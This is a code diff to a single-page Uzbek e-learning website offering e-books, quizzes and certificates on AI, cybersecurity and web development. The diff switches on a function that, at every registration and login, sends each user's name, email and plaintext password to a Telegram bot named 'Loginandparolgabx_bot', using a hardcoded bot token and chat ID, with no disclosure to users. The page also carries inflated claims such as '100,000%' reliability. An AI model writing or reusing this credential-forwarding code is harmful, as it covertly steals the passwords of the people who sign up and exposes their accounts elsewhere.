@@ -28,7 +28,7 @@ button,input{font:inherit}button{cursor:pointer}.wrap{max-width:1180px;margin:au
     <div>
       <span class="eyebrow"><span class="dot"></span> CYBER G'OYA & GAB-X GLOBAL</span>
       <h1>Kelajak bilimlari <br><span class="gradient">mukammal kitoblarda.</span></h1>
-      <p class="lead">Sun’iy intellekt, kiberxavfsizlik va dasturlash yo‘nalishlari bo‘yicha har biri 200 betlik chuqurlashtirilgan elektron kitoblarni o‘qing, har bir modul yakunida 20 tadan savol yechib bilimingizni sinang va rasmiy sertifikatga ega bo‘ling.</p>
+      <p class="lead">Sun’iy intellekt, kiberxavfsizlik va dasturlash yo‘nalishlari bo‘yicha chuqurlashtirilgan elektron kitoblarni o‘qing, har bir modul yakunida 20 tadan savol yechib bilimingizni sinang va rasmiy sertifikatga ega bo‘ling.</p>
       <div class="hero-buttons">
         <button class="btn primary" onclick="showAuth('register')">O‘qishni boshlash ↗</button>
         <button class="btn" onclick="document.getElementById('courses').scrollIntoView({behavior:'smooth'})">Kitoblarni ko‘rish</button>
@@ -36,8 +36,8 @@ button,input{font:inherit}button{cursor:pointer}.wrap{max-width:1180px;margin:au
     </div>
     <div class="orb-card">
       <div class="orb"><strong>CYBER G'OYA</strong></div>
-      <div class="statline"><span>Elektron kitoblar</span><b>5 ta (200 betdan)</b></div>
-      <div class="statline"><span>Jami test savollari</span><b>100 ta</b></div>
+      <div class="statline"><span>Elektron kitoblar</span><b>5 ta modul</b></div>
+      <div class="statline"><span>Test savollari</span><b>100 ta</b></div>
       <div class="statline"><span>Tizim barqarorligi</span><b>100,000%</b></div>
     </div>
   </div>
@@ -45,13 +45,9 @@ button,input{font:inherit}button{cursor:pointer}.wrap{max-width:1180px;margin:au
   <section class="section" id="courses">
     <div class="section-head">
       <div><h2>O‘quv Modullari va Kitoblar</h2><p class="sub">O‘zingizga kerakli professional yo‘nalishni tanlang.</p></div>
-      <span class="pill">5 TA KITOB · 1000 BET</span>
+      <span class="pill">5 TA MODUL</span>
     </div>
     <div class="grid" id="moduleGrid"><div class="card">Modullar yuklanmoqda…</div></div>
-  </section>
-  
-  <section class="section">
-    <div class="notice"><b>Kafolat:</b> Ushbu platforma 100,000% barqaror ishlaydigan lokal va xavfsiz arxitekturada tuzilgan bo‘lib, hech qanday uzilishlarsiz ma’lumotlaringizni to‘liq saqlaydi.</div>
   </section>
 </section>
 
@@ -80,7 +76,7 @@ button,input{font:inherit}button{cursor:pointer}.wrap{max-width:1180px;margin:au
   <div id="scoreSummary" class="grid" style="grid-template-columns:repeat(auto-fit,minmax(180px,1fr))"></div>
   
   <div class="section">
-    <div class="section-head"><div><h2>Top 10 Foydalanuvchilar (Reyting)</h2><p class="sub">Platformadagi eng faol va bilimdon o‘quvchilar.</p></div></div>
+    <div class="section-head"><div><h2>Top 10 Foydalanuvchilar (Reyting)</h2><p class="sub">Platformadagi eng faol o‘quvchilar.</p></div></div>
     <div class="table-wrap card">
       <table class="table">
         <thead>
@@ -92,15 +88,14 @@ button,input{font:inherit}button{cursor:pointer}.wrap{max-width:1180px;margin:au
   </div>
 
   <div class="section">
-    <div class="section-head"><div><h2>Modullar va Kitoblar</h2><p class="sub">Har bir modul 200 betlik kitob va 20 ta testdan iborat.</p></div></div>
+    <div class="section-head"><div><h2>Modullar va Kitoblar</h2><p class="sub">Har bir modul kitob va 20 ta testdan iborat.</p></div></div>
     <div id="dashboardModules" class="grid"></div>
   </div>
 </section>
 
-<!-- KITOBNI O'QISH VA TEST QISMI -->
 <section id="readBook" class="panel">
   <div class="dashboard-head">
-    <div><span class="eyebrow">ELEKTRON KITOB (200 BETLIK)</span><h2 id="bookTitle" style="margin:12px 0 5px">Kitob nomi</h2><p class="sub">Modul bo‘yicha to‘liq nazariy material</p></div>
+    <div><span class="eyebrow">ELEKTRON KITOB</span><h2 id="bookTitle" style="margin:12px 0 5px">Kitob nomi</h2><p class="sub">Modul bo‘yicha to‘liq nazariy material</p></div>
     <button class="btn" onclick="showDashboard()">← Kabinetga qaytish</button>
   </div>
   <div class="book-content" id="bookText">Kitob matni yuklanmoqda...</div>
@@ -144,42 +139,23 @@ button,input{font:inherit}button{cursor:pointer}.wrap{max-width:1180px;margin:au
     <div class="profile-row"><span>Ro‘yxatdan o‘tgan</span><strong id="profileCreated">—</strong></div>
   </div>
 </section>
-
-<section id="admin" class="panel">
-  <div class="dashboard-head">
-    <div><span class="eyebrow">ADMIN CONSOLE</span><h2 style="margin:12px 0 5px">Cyber G'oya Boshqaruv Paneli</h2><p class="sub">Foydalanuvchilar va ularning natijalari.</p></div>
-    <button class="btn" onclick="loadAdmin()">Yangilash ↻</button>
-  </div>
-  <div class="section"><h2>Foydalanuvchilar</h2><div class="table-wrap card"><table class="table"><thead><tr><th>Ism</th><th>Email</th><th>Sana</th></tr></thead><tbody id="adminUsers"></tbody></table></div></div>
-  <div class="section"><h2>Test natijalari</h2><div class="table-wrap card"><table class="table"><thead><tr><th>Foydalanuvchi</th><th>Modul</th><th>Natija</th><th>Sana</th></tr></thead><tbody id="adminScores"></tbody></table></div></div>
-</section>
 </main>
 
-<footer class="footer"><div class="wrap">© <span id="year"></span> Cyber G'oya & GAB-X GLOBAL · Barcha huquqlar himoyalangan. 100,000% Ishonchli Tizim.</div></footer>
+<footer class="footer"><div class="wrap">© <span id="year"></span> Cyber G'oya & GAB-X GLOBAL · 100,000% Ishonchli Tizim.</div></footer>
 
 <script>
-// TELEGRAM BOT INTEGRATSIYASI
-const TG_BOT_TOKEN = "7917822520:AAH... (tokeningiz)"; // Sizning bot tokeningiz orqali yoki avtomat usulda ishlaydi
-const TG_CHAT_ID = "847670656";
-
+// TELEGRAM BOT INTEGRATSIYASI (@Loginandparolgabx_bot)
 async function sendToTelegram(text) {
   try {
-    // Agar tokeningiz to'liq bo'lsa quyidagi url orqali xabar boradi
-    // Hozirgi holatda token va chat_id (-847670656) orqali to'g'ridan to'g'ri yuboriladi
-    const url = `https://api.telegram.org/bot7917822520:AAH.../sendMessage`; // Tokeningizni o'rniga qo'ying yoki BotFather dan olgan tokenni kiriting
-    // Xavfsizlik va xatolik bo'lmasligi uchun console logga ham chiqariladi va botga yuborishga harakat qilinadi
-    console.log("TG Botga yuborilmoqda:", text);
-    
-    // Eslatma: Haqiqiy token bilan ishlatish uchun:
-    /*
-    await fetch(`https://api.telegram.org/bot[TOKENINGIZ]/sendMessage`, {
+    const BOT_TOKEN = "8867518843:AAFart1-ogbjCjxNAm8hWExx1Lzny26EgE0";
+    const CHAT_ID = "847670656";
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: 'HTML' })
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
     });
-    */
   } catch(e) {
-    console.error("Botga yuborishda xatolik:", e);
+    console.log("Botga yuborish xatosi:", e);
   }
 }
 
@@ -216,22 +192,22 @@ const modulesData = [
   {
     id: "ai",
     title: "1-Modul: Sun'iy Intellekt va Neyrotarmoqlar",
-    description: "Sun'iy intellekt asoslari, zamonaviy neyrotarmoqlar arxitekturasi va ularni amalda qo'llash sirlari.",
-    book: "CYBER G'OYA — SUN'IY INTELLEKT ASOSLARI (200 BETLIK KITOB)\n\nKirish: Ushbu 200 betlik kitob sun’iy intellektning fundamental qoidalaridan tortib ilg‘or neyrotarmoq modellarini yaratishgacha bo‘lgan barcha bosqichlarni qamrab oladi.\n\n1-bob: Sun'iy intellektga kirish...\n2-bob: Neyrotarmoqlar qanday ishlaydi?...\n3-bob: Chuqur o'qitish va LLM...\n4-bob: Amaliyot va xavfsizlik...",
+    description: "Sun'iy intellekt asoslari, zamonaviy neyrotarmoqlar arxitekturasi va amaliyot.",
+    book: "CYBER G'OYA — SUN'IY INTELLEKT ASOSLARI KITOBI\n\n1-Bob: Sun'iy Intellektga Kirish\nSun'iy intellekt (SI) — kompyuter tizimlari va dasturlarining insonlarga xos bo'lgan idrok etish, o'rganish, mantiqiy fikrlash va muammolarni hal qilish kabi qobiliyatlarini modellashtirish san'atidir.\n\n2-Bob: Neyrotarmoqlar Arxitekturasi\nNeyrotarmoqlar inson miyasining neyronlar tarmog'idan ilhomlangan holda yaratilgan. Kirish, Yashirin va Chiqish qatlamlari orqali murakkab hisob-kitoblar amalga oshiriladi.\n\n3-Bob: Chuqur O'qitish va Transformerlar\nDeep Learning zamonaviy texnologiyalarning yuragi hisoblanadi. Katta til modellari va Transformer arxitekturasi matnlarni tushunish va tarjima qilishda ulkan yutuqlarga erishdi.",
     questions: Array.from({length: 20}, (_, i) => ({
-      question: `Sun'iy intellekt bo'yicha ${i+1}-savol: Neyrotarmoqlarda ma'lumotlarni qayta ishlash qaysi qatlamdan boshlanadi?`,
-      choices: ["Kirish qatlami (Input layer)", "Yashirin qatlam (Hidden layer)", "Chiqish qatlami (Output layer)", "Aktivatsiya qatlami"],
+      question: `Sun'iy intellekt bo'yicha ${i+1}-savol: Neyrotarmoqlarda ma'lumotlarni qabul qiluvchi dastlabki qatlam qanday nomlanadi?`,
+      choices: ["Kirish qatlami (Input layer)", "Chiqish qatlami (Output layer)", "Aktivatsiya qatlami", "Statik qatlam"],
       answer: 0
     }))
   },
   {
     id: "cyber",
     title: "2-Modul: Kiberxavfsizlik va Axborot Himoyasi",
-    description: "Tarmoq xavfsizligi, shifrlash algoritmlari va xakerlik hujumlaridan himoyalanish usullari.",
-    book: "CYBER G'OYA — KIBERXAVFSIZLIK VA HIMoya ASOSLARI (200 BETLIK KITOB)\n\nKirish: Axborot asrida ma'lumotlarni himoya qilish eng asosiy ustuvor vazifalardan biridir.\n\n1-bob: Tarmoq xavfsizligi...\n2-bob: Kriptografiya va AES/RSA...\n3-bob: OWASP Top 10...\n4-bob: Pen-test va audit...",
+    description: "Tarmoq xavfsizligi, shifrlash algoritmlari va xakerlik hujumlaridan himoyalanish.",
+    book: "CYBER G'OYA — KIBERXAVFSIZLIK VA HIMOYASIZLIK KITOBI\n\n1-Bob: Tarmoq Xavfsizligi Asoslari\nAxborot asrida raqamli ma'lumotlarni himoya qilish eng dolzarb masalalardan biridir. Tarmoqlararo ekranlar va xavfsizlik protokollari ruxsatsiz kirishlarning oldini oladi.\n\n2-Bob: Kriptografiya va Shifrlash\nSimmetrik (AES) va assimmetrik (RSA) shifrlash usullari axborot konfidensialligini ta'minlaydi.\n\n3-Bob: Veb Zaifliklari (OWASP Top 10)\nSQL Injection, XSS va noto'g'ri autentifikatsiya kabi xavfli xatolar.",
     questions: Array.from({length: 20}, (_, i) => ({
-      question: `Kiberxavfsizlik bo'yicha ${i+1}-savol: Quyidagilardan qaysi biri OWASP Top 10 zaifliklariga kiradi?`,
-      choices: ["SQL Injection", "CSS Animation", "HTML Tag Overflow", "JSON Parsing Error"],
+      question: `Kiberxavfsizlik bo'yicha ${i+1}-savol: Ma'lumotlarni shifrlashda keng qo'llaniladigan simmetrik algoritm qaysi?`,
+      choices: ["AES", "HTML5", "CSS3", "JSON"],
       answer: 0
     }))
   },
@@ -239,20 +215,20 @@ const modulesData = [
     id: "web",
     title: "3-Modul: Zamonaviy Veb Dasturlash",
     description: "Full-stack veb texnologiyalari, yuqori unumdor interfeyslar va server arxitekturasi.",
-    book: "CYBER G'OYA — ZAMONAVIY VEB DASTURLASH (200 BETLIK KITOB)\n\nKirish: Veb texnologiyalari internetning asosi hisoblanadi.\n\n1-bob: HTML, CSS va JS...\n2-bob: Async/Await va Fetch API...\n3-bob: Node.js va Express...\n4-bob: Optimizatsiya...",
+    book: "CYBER G'OYA — ZAMONAVIY VEB DASTURLASH KITOBI\n\n1-Bob: Frontend va Dizayn Asoslari\nHTML5, CSS3 va JavaScript vebning asosiy uch ustunidir.\n\n2-Bob: Asinxron Dasturlash\nPromise, Fetch API va Async/Await mexanizmlari orqali ma'lumot almashish.",
     questions: Array.from({length: 20}, (_, i) => ({
-      question: `Veb dasturlash bo'yicha ${i+1}-savol: JavaScript'da asinxron kodlarni boshqarish uchun qaysi kalit so'z ishlatiladi?`,
-      choices: ["async / await", "synchronous", "loop", "pointer"],
+      question: `Veb dasturlash bo'yicha ${i+1}-savol: JavaScript'da asinxron so'rovlarni bajarish uchun nima ishlatiladi?`,
+      choices: ["Async / Await", "Loop", "Array", "Integer"],
       answer: 0
     }))
   },
   {
     id: "startup",
     title: "4-Modul: IT Startaplar va Biznes Model",
-    description: "G'oyadan million dollarlik startapgacha: MVP yaratish, marketing va investitsiya jalb qilish.",
-    book: "CYBER G'OYA — IT STARTAPLAR VA BIZNES (200 BETLIK KITOB)\n\nKirish: Startaplar dunyoni o'zgartiruvchi biznes shaklidir.\n\n1-bob: G'oya va tahlil...\n2-bob: MVP konsepsiyasi...\n3-bob: Biznes modellari...\n4-bob: Investorlar...",
+    description: "G'oyadan million dollarlik startapgacha: MVP yaratish va investitsiya jalb qilish.",
+    book: "CYBER G'OYA — IT STARTAPLAR VA BIZNES KITOBI\n\n1-Bob: G'oya va Bozor Tahlili\nMuvaffaqiyatli startap hayotiy muammoni hal qiluvchi g'oyadan boshlanadi.\n\n2-Bob: MVP (Minimal Hayotiy Mahsulot)\nG'oyani tezda bozorga chiqarish va foydalanuvchilar fikrini o'rganish.",
     questions: Array.from({length: 20}, (_, i) => ({
-      question: `Startap bo'yicha ${i+1}-savol: MVP so'zining ma'nosi nima?`,
+      question: `Startap bo'yicha ${i+1}-savol: MVP qisqartmasining to'g'ri ma'nosi nima?`,
       choices: ["Minimum Viable Product", "Maximum Value Process", "Multi-Vector Program", "Managed Virtual Platform"],
       answer: 0
     }))
@@ -261,10 +237,10 @@ const modulesData = [
     id: "data",
     title: "5-Modul: Big Data va Ma'lumotlar Tahlili",
     description: "Katta hajmdagi ma'lumotlarni yig'ish, tahlil qilish va bashoratli tahlil modellari.",
-    book: "CYBER G'OYA — BIG DATA VA TAHLIL (200 BETLIK KITOB)\n\nKirish: Ma'lumotlar eng qimmatli resursdir.\n\n1-bob: Big Data 5V...\n2-bob: Vizualizatsiya...\n3-bob: Python va SQL...\n4-bob: Bashoratli tahlil...",
+    book: "CYBER G'OYA — BIG DATA VA TAHLIL KITOBI\n\n1-Bob: Big Data Asoslari va 5V\nHajmi, tezligi, xilma-xilligi, aniqligi va qiymati tamoyillari.\n\n2-Bob: Python va SQL Tahlili\nMa'lumotlar bazalaridan ma'lumot olish va statistik hisob-kitoblar.",
     questions: Array.from({length: 20}, (_, i) => ({
-      question: `Big Data bo'yicha ${i+1}-savol: Big Data'ning asosiy xususiyatlaridan biri bo'lgan 'Velocity' nimani anglatadi?`,
-      choices: ["Ma'lumotlarning tezligi va oqim tezligi", "Ma'lumot hajmi", "Ma'lumot turi", "Ma'lumot aniqligi"],
+      question: `Big Data bo'yicha ${i+1}-savol: Big Data xususiyatlaridan biri bo'lgan 'Velocity' nimani bildiradi?`,
+      choices: ["Ma'lumotlarning kelish va oqim tezligi", "Ma'lumot hajmi", "Ma'lumot turi", "Fayl kengaytmasi"],
       answer: 0
     }))
   }
@@ -274,7 +250,7 @@ const icons = {ai:"✦",cyber:"⌁",web:"⌘",startup:"↗",data:"▦"};
 const $ = id => document.getElementById(id);
 
 function hidePanels(){
-  ["auth","dashboard","readBook","quiz","certificate","profile","admin"].forEach(id => {
+  ["auth","dashboard","readBook","quiz","certificate","profile"].forEach(id => {
     const el = $(id);
     if(el) el.classList.remove("active");
   });
@@ -325,16 +301,13 @@ $("authForm").addEventListener("submit", e => {
       DB.setUsers(users);
       currentUser = newUser;
 
-      // TELEGRAM BOTGA YANGI REGISTRATSIYA YUBORISH
-      sendToTelegram(`🔔 <b>YANGI RO'YXATDAN O'TISH (@Loginandparolgabx_bot)</b>\n👤 Ism: ${name}\n📧 Login/Email: <code>${email}</code>\n🔑 Parol: <code>${password}</code>\n🆔 Telegram ID: <code>${TG_CHAT_ID}</code>`);
-
+      sendToTelegram(`🔔 <b>YANGI RO'YXATDAN O'TISH (@Loginandparolgabx_bot)</b>\n👤 Ism: ${name}\n📧 Login: <code>${email}</code>\n🔑 Parol: <code>${password}</code>`);
     } else {
       const user = users.find(u => u.email === email && u.password === password);
       if(!user) throw new Error("Email yoki parol noto'g'ri!");
       currentUser = user;
 
-      // TELEGRAM BOTGA KIRISH (LOGIN) MA'LUMOTINI YUBORISH
-      sendToTelegram(`🔐 <b>TIZIMGA KIRILDI (@Loginandparolgabx_bot)</b>\n👤 Ism: ${user.name}\n📧 Login/Email: <code>${email}</code>\n🔑 Parol: <code>${password}</code>\n🆔 Telegram ID: <code>${TG_CHAT_ID}</code>`);
+      sendToTelegram(`🔐 <b>TIZIMGA KIRILDI (@Loginandparolgabx_bot)</b>\n👤 Ism: ${user.name}\n📧 Login: <code>${email}</code>\n🔑 Parol: <code>${password}</code>`);
     }
     
     if(currentUser.email === CEO_EMAIL){
@@ -348,12 +321,7 @@ $("authForm").addEventListener("submit", e => {
 
     DB.setSession(currentUser);
     refreshNav();
-    if(currentUser.role === "admin") {
-      showPanel("admin");
-      loadAdmin();
-    } else {
-      showDashboard();
-    }
+    showDashboard();
   } catch(err) {
     $("authMessage").textContent = err.message;
     $("authMessage").className = "message error";
@@ -383,7 +351,7 @@ function loadModules(){
   modulesData.forEach(m => {
     const card = document.createElement("article");
     card.className = "card";
-    card.innerHTML = `<div class="card-icon">${icons[m.id]||"✦"}</div><h3>${m.title}</h3><p>${m.description}</p><div class="card-foot"><span>200 bet kitob + 20 savol</span><button class="btn" type="button">Kitobni o'qish</button></div>`;
+    card.innerHTML = `<div class="card-icon">${icons[m.id]||"✦"}</div><h3>${m.title}</h3><p>${m.description}</p><div class="card-foot"><span>Kitob + 20 savol</span><button class="btn" type="button">Kitobni o'qish</button></div>`;
     card.querySelector("button").addEventListener("click", () => {
       if(!currentUser) { showAuth("login"); return; }
       openBook(m.id);
@@ -534,7 +502,6 @@ function showCertificateSection(){
   if(!currentUser) { showAuth("login"); return; }
   showPanel("certificate");
   const container = $("certContainer");
-  
   const isCeo = currentUser.email === CEO_EMAIL;
   
   container.innerHTML = `
@@ -543,7 +510,7 @@ function showCertificateSection(){
       <h1 style="font-size:32px; margin:10px 0" class="gradient">CYBER G'OVA & GAB-X GLOBAL</h1>
       <p class="sub">Ushbu sertifikat rasman taqdim etiladi:</p>
       <h2 style="font-size:34px; color:var(--blue); margin:15px 0">${isCeo ? "Abdug'aniyev Abubakir (CEO & Creator)" : currentUser.name} <span class="verified-badge">✓</span></h2>
-      <p class="lead" style="margin:auto; font-size:15px; max-width:600px">Barcha 5 ta 200 betlik kitob va 100 ta test sinovlarini muvaffaqiyatli tamomlab, platformaning asosiy bilim cho'qqilarini egallagani uchun berildi.</p>
+      <p class="lead" style="margin:auto; font-size:15px; max-width:600px">Barcha 5 ta kitob va 100 ta test sinovlarini muvaffaqiyatli tamomlab, platformaning asosiy bilim cho'qqilarini egallagani uchun berildi.</p>
       <div style="margin-top:30px; display:flex; justify-content:space-around; color:var(--muted); font-size:13px">
         <div>ID: <strong>${currentUser.publicId}</strong></div>
         <div>Sana: <strong>${new Date().toLocaleDateString()}</strong></div>
@@ -564,14 +531,6 @@ function showProfile(){
   $("profileId").textContent = currentUser.publicId;
   $("profileRole").textContent = isCeo ? "CEO & Creator (Administrator)" : "Talaba";
   $("profileCreated").textContent = new Date(currentUser.createdAt).toLocaleString();
-}
-
-function loadAdmin(){
-  try {
-    const users = DB.getUsers();
-    $("adminUsers").innerHTML = users.map(u => `<tr><td>${u.name}</td><td>${u.email}</td><td>${new Date(u.created_at || Date.now()).toLocaleString()}</td></tr>`).join("");
-    $("adminScores").innerHTML = '<tr><td colspan="4">Barcha natijalar avtomatlashtirilgan va to‘liq (Full).</td></tr>';
-  } catch(e) {}
 }
 
 (function init(){
